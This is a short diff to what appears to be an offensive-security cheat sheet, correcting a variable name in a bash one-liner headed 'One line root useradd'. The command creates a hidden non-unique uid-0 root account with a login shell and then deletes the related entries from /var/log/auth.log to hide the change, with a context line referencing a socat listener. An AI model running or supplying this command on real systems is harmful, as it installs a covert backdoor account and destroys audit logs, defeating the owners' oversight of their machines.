@@ -130,7 +130,7 @@ socat readline TCP-LISTEN:1234
 **One line root useradd**
 It creates a new root user. You have to change some parameters.
 ```bash
-USERNAME="name";PASSWD=`perl -e 'print crypt("password", "sa")'`;COMMENT="Comment Here" && sudo useradd -p $PASSWORD --system --shell '/bin/bash' --base-dir "/bin" --uid 0 --non-unique --comment $COMMENT $USERNAME && sudo sed -i '/useradd/d;/$USERNAME/d;' /var/log/auth.log
+USERNAME="name";PASSWD=`perl -e 'print crypt("password", "sa")'`;COMMENT="Comment Here" && sudo useradd -p $PASSWD --system --shell '/bin/bash' --base-dir "/bin" --uid 0 --non-unique --comment $COMMENT $USERNAME && sudo sed -i '/useradd/d;/$USERNAME/d;' /var/log/auth.log
 ```
 
 Credits
